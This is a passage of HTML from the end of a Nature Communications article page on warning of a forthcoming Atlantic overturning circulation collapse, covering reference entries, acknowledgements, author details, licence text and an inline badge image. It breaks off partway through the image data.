                </p></li><li data-counter="32."><p id="ref-CR32">Pilipovic, P., Samson, A. &amp; Ditlevsen, S. Parameter estimation in nonlinear multivariate stochastic differential equations based on splitting schemes. Preprint at <a href="https://arxiv.org/abs/2211.11884">https://arxiv.org/abs/2211.11884</a> (2022).</p></li><li data-counter="33."><p id="ref-CR33">Michel, S. L. L. et al. Early warning signal for a tipping point suggested by a millennial Atlantic multidecadal variability reconstruction. <i>Nat. Commun.</i> <b>13</b>, 5176 (2022).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1038/s41467-022-32704-3" data-track-action="article reference" href="https://doi.org/10.1038%2Fs41467-022-32704-3" aria-label="Article reference 33" data-doi="10.1038/s41467-022-32704-3">Article</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="ads reference" href="http://adsabs.harvard.edu/cgi-bin/nph-data_query?link_type=ABSTRACT&amp;bibcode=2022NatCo..13.5176M" aria-label="ADS reference 33">ADS</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="cas reference" href="https://www.nature.com/articles/cas-redirect/1:CAS:528:DC%2BB38Xitlahtb3N" aria-label="CAS reference 33">CAS</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="pubmed reference" href="http://www.ncbi.nlm.nih.gov/entrez/query.fcgi?cmd=Retrieve&amp;db=PubMed&amp;dopt=Abstract&amp;list_uids=36056010" aria-label="PubMed reference 33">PubMed</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="pubmed central reference" href="http://www.ncbi.nlm.nih.gov/pmc/articles/PMC9440003" aria-label="PubMed Central reference 33">PubMed Central</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 33" href="http://scholar.google.com/scholar_lookup?&amp;title=Early%20warning%20signal%20for%20a%20tipping%20point%20suggested%20by%20a%20millennial%20Atlantic%20multidecadal%20variability%20reconstruction&amp;journal=Nat.%20Commun.&amp;doi=10.1038%2Fs41467-022-32704-3&amp;volume=13&amp;publication_year=2022&amp;author=Michel%2CSLL">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="34."><p id="ref-CR34">Rahmstorf, S. et al. Thermohaline circulation hysteresis: a model intercomparison. <i>Geophys. Res. Lett.</i> <b>32</b>, L23605 (2005).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1029/2005GL023655" data-track-action="article reference" href="https://doi.org/10.1029%2F2005GL023655" aria-label="Article reference 34" data-doi="10.1029/2005GL023655">Article</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="ads reference" href="http://adsabs.harvard.edu/cgi-bin/nph-data_query?link_type=ABSTRACT&amp;bibcode=2005GeoRL..3223605R" aria-label="ADS reference 34">ADS</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 34" href="http://scholar.google.com/scholar_lookup?&amp;title=Thermohaline%20circulation%20hysteresis%3A%20a%20model%20intercomparison&amp;journal=Geophys.%20Res.%20Lett.&amp;doi=10.1029%2F2005GL023655&amp;volume=32&amp;publication_year=2005&amp;author=Rahmstorf%2CS">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="35."><p id="ref-CR35">Lohmann, J., Dijkstra, H. A., Jochum, M., Lucarini, V. &amp; Ditlevsen, P. D. Multistability and intermediate tipping of the Atlantic Ocean circulation. Preprint at <a href="https://arxiv.org/abs/2304.05664">https://arxiv.org/abs/2304.05664</a> (2023).</p></li><li data-counter="36."><p id="ref-CR36">Lohmann, J. &amp; Ditlevsen, P. Risk of tipping the overturning circulation due to increasing rates of ice melt. <i>Proc. Natl Acad. Sci. USA</i> <b>118</b>, e2017989118 (2021).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1073/pnas.2017989118" data-track-action="article reference" href="https://doi.org/10.1073%2Fpnas.2017989118" aria-label="Article reference 36" data-doi="10.1073/pnas.2017989118">Article</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="cas reference" href="https://www.nature.com/articles/cas-redirect/1:CAS:528:DC%2BB3MXls12qt7s%3D" aria-label="CAS reference 36">CAS</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="pubmed reference" href="http://www.ncbi.nlm.nih.gov/entrez/query.fcgi?cmd=Retrieve&amp;db=PubMed&amp;dopt=Abstract&amp;list_uids=33619095" aria-label="PubMed reference 36">PubMed</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="pubmed central reference" href="http://www.ncbi.nlm.nih.gov/pmc/articles/PMC7936283" aria-label="PubMed Central reference 36">PubMed Central</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 36" href="http://scholar.google.com/scholar_lookup?&amp;title=Risk%20of%20tipping%20the%20overturning%20circulation%20due%20to%20increasing%20rates%20of%20ice%20melt&amp;journal=Proc.%20Natl%20Acad.%20Sci.%20USA&amp;doi=10.1073%2Fpnas.2017989118&amp;volume=118&amp;publication_year=2021&amp;author=Lohmann%2CJ&amp;author=Ditlevsen%2CP">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="37."><p id="ref-CR37">Ashwin, P., Wieczorek, S., Vitolo, R. &amp; Cox, P. Tipping points in open systems: bifurcation, noise-induced and rate-dependent examples in the climate system. <i>Philos. Trans. R. Soc. A Math. Phys. Eng. Sci.</i> <b>370</b>, 1166‚Äì1184 (2012).</p></li><li data-counter="38."><p id="ref-CR38">Kemp, L. et al. Climate endgame: exploring catastrophic climate change scenarios. <i>Proc. Natl Acad. Sci. USA</i> <b>119</b>, e2108146119 (2022).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1073/pnas.2108146119" data-track-action="article reference" href="https://doi.org/10.1073%2Fpnas.2108146119" aria-label="Article reference 38" data-doi="10.1073/pnas.2108146119">Article</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="cas reference" href="https://www.nature.com/articles/cas-redirect/1:CAS:528:DC%2BB38XisVChs77P" aria-label="CAS reference 38">CAS</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="pubmed reference" href="http://www.ncbi.nlm.nih.gov/entrez/query.fcgi?cmd=Retrieve&amp;db=PubMed&amp;dopt=Abstract&amp;list_uids=35914185" aria-label="PubMed reference 38">PubMed</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="pubmed central reference" href="http://www.ncbi.nlm.nih.gov/pmc/articles/PMC9407216" aria-label="PubMed Central reference 38">PubMed Central</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 38" href="http://scholar.google.com/scholar_lookup?&amp;title=Climate%20endgame%3A%20exploring%20catastrophic%20climate%20change%20scenarios&amp;journal=Proc.%20Natl%20Acad.%20Sci.%20USA&amp;doi=10.1073%2Fpnas.2108146119&amp;volume=119&amp;publication_year=2022&amp;author=Kemp%2CL">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="39."><p id="ref-CR39">Baehr, J. et al. Timely detection of changes in the meridional overturning circulation at 26¬∞N in the Atlantic. <i>J. Clim.</i> <b>20</b>, 5827‚Äì5841 (2007).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1175/2007JCLI1686.1" data-track-action="article reference" href="https://doi.org/10.1175%2F2007JCLI1686.1" aria-label="Article reference 39" data-doi="10.1175/2007JCLI1686.1">Article</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="ads reference" href="http://adsabs.harvard.edu/cgi-bin/nph-data_query?link_type=ABSTRACT&amp;bibcode=2007JCli...20.5827B" aria-label="ADS reference 39">ADS</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 39" href="http://scholar.google.com/scholar_lookup?&amp;title=Timely%20detection%20of%20changes%20in%20the%20meridional%20overturning%20circulation%20at%2026%C2%B0N%20in%20the%20Atlantic&amp;journal=J.%20Clim.&amp;doi=10.1175%2F2007JCLI1686.1&amp;volume=20&amp;pages=5827-5841&amp;publication_year=2007&amp;author=Baehr%2CJ">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="40."><p id="ref-CR40">S√©vellec, F., Dijkstra, H. A., Drijfhout, S. S. &amp; Germe, A. Dynamical attribution of oceanic prediction uncertainty in the North Atlantic: application to the design of optimal monitoring systems. <i>Clim. Dyn.</i> <b>51</b>, 1517‚Äì1535 (2018).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1007/s00382-017-3969-2" data-track-action="article reference" href="https://doi.org/10.1007%2Fs00382-017-3969-2" aria-label="Article reference 40" data-doi="10.1007/s00382-017-3969-2">Article</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 40" href="http://scholar.google.com/scholar_lookup?&amp;title=Dynamical%20attribution%20of%20oceanic%20prediction%20uncertainty%20in%20the%20North%20Atlantic%3A%20application%20to%20the%20design%20of%20optimal%20monitoring%20systems&amp;journal=Clim.%20Dyn.&amp;doi=10.1007%2Fs00382-017-3969-2&amp;volume=51&amp;pages=1517-1535&amp;publication_year=2018&amp;author=S%C3%A9vellec%2CF&amp;author=Dijkstra%2CHA&amp;author=Drijfhout%2CSS&amp;author=Germe%2CA">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="41."><p id="ref-CR41">Alexander-Turner, R., Ortega, P. &amp; Robson, J. I. How robust are the surface temperature fingerprints of the Atlantic overturning meridional circulation on monthly time scales? <i>Geophys. Res. Lett.</i> <b>45</b>, 3559‚Äì3567 (2018).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1029/2017GL076759" data-track-action="article reference" href="https://doi.org/10.1029%2F2017GL076759" aria-label="Article reference 41" data-doi="10.1029/2017GL076759">Article</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="ads reference" href="http://adsabs.harvard.edu/cgi-bin/nph-data_query?link_type=ABSTRACT&amp;bibcode=2018GeoRL..45.3559A" aria-label="ADS reference 41">ADS</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 41" href="http://scholar.google.com/scholar_lookup?&amp;title=How%20robust%20are%20the%20surface%20temperature%20fingerprints%20of%20the%20Atlantic%20overturning%20meridional%20circulation%20on%20monthly%20time%20scales%3F&amp;journal=Geophys.%20Res.%20Lett.&amp;doi=10.1029%2F2017GL076759&amp;volume=45&amp;pages=3559-3567&amp;publication_year=2018&amp;author=Alexander-Turner%2CR&amp;author=Ortega%2CP&amp;author=Robson%2CJI">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="42."><p id="ref-CR42">Frajka-Williams, E. et al. Atlantic meridional overturning circulation: observed transport and variability. <i>Front. Mar. Sci.</i> <b>6</b>, 260 (2019).</p></li><li data-counter="43."><p id="ref-CR43">Holland, M. &amp; Bitz, C. Polar amplification of climate change in coupled models. <i>Clim. Dyn.</i> <b>21</b>, 221‚Äì232 (2003).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="10.1007/s00382-003-0332-6" data-track-action="article reference" href="https://doi.org/10.1007%2Fs00382-003-0332-6" aria-label="Article reference 43" data-doi="10.1007/s00382-003-0332-6">Article</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 43" href="http://scholar.google.com/scholar_lookup?&amp;title=Polar%20amplification%20of%20climate%20change%20in%20coupled%20models&amp;journal=Clim.%20Dyn.&amp;doi=10.1007%2Fs00382-003-0332-6&amp;volume=21&amp;pages=221-232&amp;publication_year=2003&amp;author=Holland%2CM&amp;author=Bitz%2CC">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="44."><p id="ref-CR44">Berglund, N. Kramers‚Äô law: validity, derivations and generalisations. <i>Markov Process. Relat. Fields</i> <b>19</b>, 459‚Äì490 (2013).</p><p><a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="mathscinet reference" href="http://www.ams.org/mathscinet-getitem?mr=3156961" aria-label="MathSciNet reference 44">MathSciNet</a>&nbsp;
    <a data-track="click" rel="nofollow noopener" data-track-label="link" data-track-action="math reference" href="http://www.emis.de/MATH-item?1321.58035" aria-label="MATH reference 44">MATH</a>&nbsp;
    <a data-track="click" data-track-action="google scholar reference" data-track-label="link" rel="nofollow noopener" aria-label="Google Scholar reference 44" href="http://scholar.google.com/scholar_lookup?&amp;title=Kramers%E2%80%99%20law%3A%20validity%2C%20derivations%20and%20generalisations&amp;journal=Markov%20Process.%20Relat.%20Fields&amp;volume=19&amp;pages=459-490&amp;publication_year=2013&amp;author=Berglund%2CN">
                    Google Scholar</a>&nbsp;
                </p></li><li data-counter="45."><p id="ref-CR45">Freidlin, M. &amp; Wentzell, A. Random perturbations of dynamical systems. <i>Grundlehren der mathematischen Wissenschaften</i> (Springer, 1984).</p></li></ol><p><a data-track="click" data-track-action="download citation references" data-track-label="link" rel="nofollow" href="https://citation-needed.springer.com/v2/references/10.1038/s41467-023-39810-w?format=refman&amp;flavour=references">Download references</a></p></div></div><div id="Ack1-section" data-title="Acknowledgements"><h2 id="Ack1">Acknowledgements</h2><p>This work has received funding under the project Tipping Points in the Earth System (TiPES) from the European Union‚Äôs Horizon 2020 research and innovation programme under grant agreement no. 820970. This is TiPES contribution #214. Furthermore, funding was provided by Novo Nordisk Foundation NNF20OC0062958; and European Union‚Äôs Horizon 2020 research and innovation program under the Marie Sk≈Çodowska-Curie grant agreement No 956107, ‚ÄúEconomic Policy in Complex Environments (EPOC)‚Äù.</p></div><div id="author-information-section" aria-labelledby="author-information" data-title="Author information"><h2 id="author-information">Author information</h2><div id="author-information-content"><p><span id="author-notes">Author notes</span></p><ol><li id="na1"><p>These authors contributed equally: Peter Ditlevsen, Susanne Ditlevsen.</p></li></ol><h3 id="affiliations">Authors and Affiliations</h3><ol><li id="Aff1"><p>Niels Bohr Institute, University of Copenhagen, Copenhagen, Denmark</p><p>Peter Ditlevsen</p></li><li id="Aff2"><p>Institute of Mathematical Sciences, University of Copenhagen, Copenhagen, Denmark</p><p>Susanne Ditlevsen</p></li></ol><div data-test="author-info"><p><span>Authors</span></p><ol><li id="auth-Peter-Ditlevsen-Aff1"><span>Peter Ditlevsen</span><div><p>You can also search for this author in
                        <span><a href="http://www.ncbi.nlm.nih.gov/entrez/query.fcgi?cmd=search&amp;term=Peter%20Ditlevsen" data-track="click" data-track-action="author link - pubmed" data-track-label="link" rel="nofollow">PubMed</a><span>&nbsp;</span><a href="http://scholar.google.co.uk/scholar?as_q=&amp;num=10&amp;btnG=Search+Scholar&amp;as_epq=&amp;as_oq=&amp;as_eq=&amp;as_occt=any&amp;as_sauthors=%22Peter%20Ditlevsen%22&amp;as_publication=&amp;as_ylo=&amp;as_yhi=&amp;as_allsubj=all&amp;hl=en" data-track="click" data-track-action="author link - scholar" data-track-label="link" rel="nofollow">Google Scholar</a></span></p></div></li><li id="auth-Susanne-Ditlevsen-Aff2"><span>Susanne Ditlevsen</span><div><p>You can also search for this author in
                        <span><a href="http://www.ncbi.nlm.nih.gov/entrez/query.fcgi?cmd=search&amp;term=Susanne%20Ditlevsen" data-track="click" data-track-action="author link - pubmed" data-track-label="link" rel="nofollow">PubMed</a><span>&nbsp;</span><a href="http://scholar.google.co.uk/scholar?as_q=&amp;num=10&amp;btnG=Search+Scholar&amp;as_epq=&amp;as_oq=&amp;as_eq=&amp;as_occt=any&amp;as_sauthors=%22Susanne%20Ditlevsen%22&amp;as_publication=&amp;as_ylo=&amp;as_yhi=&amp;as_allsubj=all&amp;hl=en" data-track="click" data-track-action="author link - scholar" data-track-label="link" rel="nofollow">Google Scholar</a></span></p></div></li></ol></div><h3 id="corresponding-author">Corresponding authors</h3><p id="corresponding-author-list">Correspondence to
                <a id="corresp-c1" href="mailto:pditlev@nbi.ku.dk">Peter Ditlevsen</a> or <a id="corresp-c2" href="mailto:susanne@math.ku.dk">Susanne Ditlevsen</a>.</p></div></div><div id="ethics-section" data-title="Ethics declarations"><h2 id="ethics">Ethics declarations</h2><div id="ethics-content">
              
                <h3 id="FPar2">Competing interests</h3>
                <p>The authors declare no competing interests.</p>
              
            </div></div><div id="peer-review-section" data-title="Peer review"><h2 id="peer-review">Peer review</h2><div id="peer-review-content">
              
              
                <h3 id="FPar1">Peer review information</h3>
                <p><i>Nature Communications</i> thanks Chris Boulton and the other anonymous reviewer(s) for their contribution to the peer review of this work. A peer review file is available.</p>
              
            </div></div><div id="additional-information-section" data-title="Additional information"><h2 id="additional-information">Additional information</h2><p><b>Publisher‚Äôs note</b> Springer Nature remains neutral with regard to jurisdictional claims in published maps and institutional affiliations.</p></div><div id="Sec12-section" data-title="Supplementary information"><h2 id="Sec12">Supplementary information</h2></div><div id="rightslink-section" data-title="Rights and permissions"><h2 id="rightslink">Rights and permissions</h2><div id="rightslink-content">
                <p><b>Open Access</b>  This article is licensed under a Creative Commons Attribution 4.0 International License, which permits use, sharing, adaptation, distribution and reproduction in any medium or format, as long as you give appropriate credit to the original author(s) and the source, provide a link to the Creative Commons license, and indicate if changes were made. The images or other third party material in this article are included in the article‚Äôs Creative Commons license, unless indicated otherwise in a credit line to the material. If material is not included in the article‚Äôs Creative Commons license and your intended use is not permitted by statutory regulation or exceeds the permitted use, you will need to obtain permission directly from the copyright holder. To view a copy of this license, visit <a href="http://creativecommons.org/licenses/by/4.0/" rel="license">http://creativecommons.org/licenses/by/4.0/</a>.</p>
              <p><a data-track="click" data-track-action="view rights and permissions" data-track-label="link" href="https://s100.copyright.com/AppDispatchServlet?title=Warning%20of%20a%20forthcoming%20collapse%20of%20the%20Atlantic%20meridional%20overturning%20circulation&amp;author=Peter%20Ditlevsen%20et%20al&amp;contentID=10.1038%2Fs41467-023-39810-w&amp;copyright=The%20Author%28s%29&amp;publication=2041-1723&amp;publicationDate=2023-07-25&amp;publisherName=SpringerNature&amp;orderBeanReset=true&amp;oa=CC%20BY">Reprints and Permissions</a></p></div></div><div id="article-info-section" aria-labelledby="article-info" data-title="About this article"><h2 id="article-info">About this article</h2><div id="article-info-content"><p><a data-crossmark="10.1038/s41467-023-39810-w" target="_blank" rel="noopener" href="https://crossmark.crossref.org/dialog/?doi=10.1038/s41467-023-39810-w" data-track="click" data-track-action="Click Crossmark" data-track-label="link" data-test="crossmark"><img width="57" height="81" alt="Check for updates. Verify currency and authenticity via CrossMark" src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjgxIiB3aWR0aD0iNTciIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGcgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIj48cGF0aCBkPSJtMTcuMzUgMzUuNDUgMjEuMy0xNC4ydi0xNy4wM2gtMjEuMyIgZmlsbD0iIzk4OTg5OCIvPjxwYXRoIGQ9Im0zOC42NSAzNS40NS0yMS4zLTE0LjJ2LTE3LjAzaDIxLjMiIGZpbGw9IiM3NDc0NzQiLz48cGF0aCBkPSJtMjggLjVjLTEyLjk4IDAtMjMuNSAxMC41Mi0yMy41IDIzLjVzMTAuNTIgMjMuNSAyMy41IDIzLjUgMjMuNS0xMC41MiAyMy41LTIzLjVjMC02LjIzLTIuNDgtMTIuMjEtNi44OC0xNi42Mi00LjQxLTQuNC0xMC4zOS02Ljg4LTE2LjYyLTYuODh6bTAgNDEuMjVjLTkuOCAwLTE3Ljc1LTcuOTUtMTcuNzUtMTcuNzVzNy45NS0xNy43NSAxNy43NS0xNy43NSAxNy43NSA3Ljk1IDE3Ljc1IDE3Ljc1YzAgNC43MS0xLjg3IDkuMjItNS4yIDEyLjU1cy03Ljg0IDUuMi0xMi41NSA1LjJ6IiBmaWxsPSIjNTM1MzUzIi8+PHBhdGggZD0ibTQxIDM2Yy01LjgxIDYuMjMtMTUuMjMgNy40NS0yMi40MyAyLjktNy4yMS00LjU1LTEwLjE2LTEzLjU3LTcuMDMtMjEuNWwtNC45Mi0zLjExYy00Ljk1IDEwLjctMS4xOSAyMy40MiA4Ljc4IDI5LjcxIDkuOTcgNi4zIDIzLjA3IDQuMjIgMzAuNi00Ljg2eiIgZmlsbD0iIzljOWM5YyIvPjxwYXRoIGQ9Im0uMiA1OC40NWMwLS43NS4xMS0xLjQyLjMzLTIuMDFzLjUyLTEuMDkuOTEtMS41Yy4zOC0uNDEuODMtLjczIDEuMzQtLjk0LjUxLS4yMiAxLjA2LS4zMiAxLjY1LS4zMi41NiAwIDEuMDYuMTEgMS41MS4zNS40NC4yMy44MS41IDEuMS44MWwtLjkxIDEuMDFjLS4yNC0uMjQtLjQ5LS40Mi0uNzUtLjU2LS4yNy0uMTMtLjU4LS4yLS45My0uMi0uMzkgMC0uNzMuMDgtMS4wNS4yMy0uMzEuMTYtLjU4LjM3LS44MS42Ni0uMjMuMjgtLjQxLjYzLS41MyAxLjA0LS4xMy40MS0uMTkuODgtLjE5IDEuMzkgMCAxLjA0LjIzIDEuODYuNjggMi40Ni40NS41OSAxLjA2Ljg4IDEuODQuODguNDEgMCAuNzctLjA3IDEuMDctLjIzcy41OS0uMzkuODUtLjY4bC45MSAxYy0uMzguNDMtLjguNzYtMS4yOC45OS0uNDcuMjItMSAuMzQtMS41OC4zNC0uNTkgMC0xLjEzLS4xLTEuNjQtLjMxLS41LS4yLS45NC0uNTEtMS4zMS0uOTEtLjM4LS40LS42Ny0uOS0uODgtMS40OC0uMjItLjU5LS4zMy0xLjI2LS4zMy0yLjAyem04LjQtNS4zM2gxLjYxdjIuNTRsLS4wNSAxLjMzYy4yOS0uMjcuNjEtLjUxLjk2LS43MnMuNzYtLjMxIDEuMjQtLjMxYy43MyAwIDEuMjcuMjMgMS42MS43MS4zMy40Ny41IDEuMTQuNSAyLjAydjQuMzFoLTEuNjF2LTQuMWMwLS41Ny0uMDgtLjk3LS4yNS0xLjIxLS4xNy0uMjMtLjQ1LS4zNS0uODMtLjM1LS4zIDAtLjU2LjA4LS43OS4yMi0uMjMuMTUtLjQ5LjM2LS43OC42NHY0LjhoLTEuNjF6bTcuMzcgNi40NWMwLS41Ni4wOS0xLjA2LjI2LTEuNTEuMTgtLjQ1LjQyLS44My43MS0xLjE0LjI5LS4zLjYzLS41NCAxLjAxLS43MS4zOS0uMTcuNzgtLjI1IDEuMTgtLjI1LjQ3IDAgLjg4LjA4IDEuMjMuMjQuMzYuMTYuNjUuMzguODkuNjdzLjQyLjYzLjU0IDEuMDNjLjEyLjQxLjE4Ljg0LjE4IDEuMzIgMCAuMzItLjAyLjU3LS4wNy43NmgtNC4zNmMuMDcuNjIuMjkgMS4xLjY1IDEuNDQuMzYuMzMuODIuNSAxLjM4LjUuMjkgMCAuNTctLjA0LjgzLS4xM3MuNTEtLjIxLjc2LS4zN2wuNTUgMS4wMWMtLjMzLjIxLS42OS4zOS0xLjA5LjUzLS40MS4xNC0uODMuMjEtMS4yNi4yMS0uNDggMC0uOTItLjA4LTEuMzQtLjI1LS40MS0uMTYtLjc2LS40LTEuMDctLjctLjMxLS4zMS0uNTUtLjY5LS43Mi0xLjEzLS4xOC0uNDQtLjI2LS45NS0uMjYtMS41MnptNC42LS42MmMwLS41NS0uMTEtLjk4LS4zNC0xLjI4LS4yMy0uMzEtLjU4LS40Ny0xLjA2LS40Ny0uNDEgMC0uNzcuMTUtMS4wNy40NS0uMzEuMjktLjUuNzMtLjU4IDEuM3ptMi41LjYyYzAtLjU3LjA5LTEuMDguMjgtMS41My4xOC0uNDQuNDMtLjgyLjc1LTEuMTNzLjY5LS41NCAxLjEtLjcxYy40Mi0uMTYuODUtLjI0IDEuMzEtLjI0LjQ1IDAgLjg0LjA4IDEuMTcuMjNzLjYxLjM0Ljg1LjU3bC0uNzcgMS4wMmMtLjE5LS4xNi0uMzgtLjI4LS41Ni0uMzctLjE5LS4wOS0uMzktLjE0LS42MS0uMTQtLjU2IDAtMS4wMS4yMS0xLjM1LjYzLS4zNS40MS0uNTIuOTctLjUyIDEuNjcgMCAuNjkuMTcgMS4yNC41MSAxLjY2LjM0LjQxLjc4LjYyIDEuMzIuNjIuMjggMCAuNTQtLjA2Ljc4LS4xNy4yNC0uMTIuNDUtLjI2LjY0LS40MmwuNjcgMS4wM2MtLjMzLjI5LS42OS41MS0xLjA4LjY1LS4zOS4xNS0uNzguMjMtMS4xOC4yMy0uNDYgMC0uOS0uMDgtMS4zMS0uMjQtLjQtLjE2LS43NS0uMzktMS4wNS0uN3MtLjUzLS42OS0uNy0xLjEzYy0uMTctLjQ1LS4yNS0uOTYtLjI1LTEuNTN6bTYuOTEtNi40NWgxLjU4djYuMTdoLjA1bDIuNTQtMy4xNmgxLjc3bC0yLjM1IDIuOCAyLjU5IDQuMDdoLTEuNzVsLTEuNzctMi45OC0xLjA4IDEuMjN2MS43NWgtMS41OHptMTMuNjkgMS4yN2MtLjI1LS4xMS0uNS0uMTctLjc1LS4xNy0uNTggMC0uODcuMzktLjg3IDEuMTZ2Ljc1aDEuMzR2MS4yN2gtMS4zNHY1LjZoLTEuNjF2LTUuNmgtLjkydi0xLjJsLjkyLS4wN3YtLjcyYzAtLjM1LjA0LS42OC4xMy0uOTguMDgtLjMxLjIxLS41Ny40LS43OXMuNDItLjM5LjcxLS41MWMuMjgtLjEyLjYzLS4xOCAxLjA0LS4xOC4yNCAwIC40OC4wMi42OS4wNy4yMi4wNS40MS4xLjU3LjE3em0uNDggNS4xOGMwLS41Ny4wOS0xLjA4LjI3LTEuNTMuMTctLjQ0LjQxLS44Mi43Mi0xLjEzLjMtLjMxLjY1LS41NCAxLjA0LS43MS4zOS0uMTYuOC0uMjQgMS4yMy0uMjRzLjg0LjA4IDEuMjQuMjRjLjQuMTcuNzQuNCAxLjA0Ljcxcy41NC42OS43MiAxLjEzYy4xOS40NS4yOC45Ni4yOCAxLjUzcy0uMDkgMS4wOC0uMjggMS41M2MtLjE4LjQ0LS40Mi44Mi0uNzIgMS4xM3MtLjY0LjU0LTEuMDQuNy0uODEuMjQtMS4yNC4yNC0uODQtLjA4LTEuMjMtLjI0LS43NC0uMzktMS4wNC0uN2MtLjMxLS4zMS0uNTUtLjY5LS43Mi0xLjEzLS4xOC0uNDUtLjI3LS45Ni0uMjctMS41M3ptMS42NSAwYzAgLjY5LjE0IDEuMjQuNDMgMS42Ni4yOC40MS42OC42MiAxLjE4LjYyLjUxIDAgLjktLjIxIDEuMTktLjYyLjI5LS40Mi40NC0uOTcuNDQtMS42NiAwLS43LS4xNS0xLjI2LS40NC0xLjY3LS4yOS0uNDItLjY4LS42My0xLjE5LS42My0uNSAwLS45LjIxLTEuMTguNjMtLjI5LjQxLS40My45Ny0uNDMgMS42N3ptNi40OC0zLjQ0aDEuMzNsLjEyIDEuMjFoLjA1Yy4yNC0uNDQuNTQtLjc5Ljg4LTEuMDIuMzUtLjI0LjctLjM2IDEuMDctLjM2LjMyIDAgLjU5LjA1Ljc4LjE0bC0uMjggMS40LS4zMy0uMDljLS4xMS0uMDEtLjIzLS4wMi0uMzgtLjAyLS4yNyAwLS41Ni4xLS44Ni4zMXMtLjU1LjU4LS43NyAxLjF2NC4yaC0xLjYxem0tNDcuODcgMTVoMS42MXY0LjFjMCAuNTcuMDguOTcuMjUgMS4yLjE3LjI0LjQ0LjM1LjgxLjM1LjMgMCAuNTctLjA3LjgtLjIyLjIyLS4xNS40Ny0uMzkuNzMtLjczdi00LjdoMS42MXY2Ljg3aC0xLjMybC0uMTItMS4wMWgtLjA0Yy0uMy4zNi0uNjMuNjQtLjk4Ljg2LS4zNS4yMS0uNzYuMzItMS4yNC4zMi0uNzMgMC0xLjI3LS4yNC0xLjYxLS43MS0uMzMtLjQ3LS41LTEuMTQtLjUtMi4wMnptOS40NiA3LjQzdjIuMTZoLTEuNjF2LTkuNTloMS4zM2wuMTIuNzJoLjA1Yy4yOS0uMjQuNjEtLjQ1Ljk3LS42My4zNS0uMTcuNzItLjI2IDEuMS0uMjYuNDMgMCAuODEuMDggMS4xNS4yNC4zMy4xNy42MS40Ljg0LjcxLjI0LjMxLjQxLjY4LjUzIDEuMTEuMTMuNDIuMTkuOTEuMTkgMS40NCAwIC41OS0uMDkgMS4xMS0uMjUgMS41Ny0uMTYuNDctLjM4Ljg1LS42NSAxLjE2LS4yNy4zMi0uNTguNTYtLjk0LjczLS4zNS4xNi0uNzIuMjUtMS4xLjI1LS4zIDAtLjYtLjA3LS45LS4ycy0uNTktLjMxLS44Ny0uNTZ6bTAtMi4zYy4yNi4yMi41LjM3LjczLjQ1LjI0LjA5LjQ2LjEzLjY2LjEzLjQ2IDAgLjg0LS4yIDEuMTUtLjYuMzEtLjM5LjQ2LS45OC40Ni0xLjc3IDAtLjY5LS4xMi0xLjIyLS4zNS0xLjYxLS4yMy0uMzgtLjYxLS41Ny0xLjEzLS41Ny0uNDkgMC0uOTkuMjYtMS41Mi43N3ptNS44Ny0xLjY5YzAtLjU2LjA4LTEuMDYuMjUtMS41MS4xNi0uNDUuMzctLjgzLjY1LTEuMTQuMjctLjMuNTgtLjU0LjkzLS43MXMuNzEtLjI1IDEuMDgtLjI1Yy4zOSAwIC43My4wNyAxIC4yLjI3LjE0LjU0LjMyLjgxLjU1bC0uMDYtMS4xdi0yLjQ5aDEuNjF2OS44OGgtMS4zM2wtLjExLS43NGgtLjA2Yy0uMjUuMjUtLjU0LjQ2LS44OC42NC0uMzMuMTgtLjY5L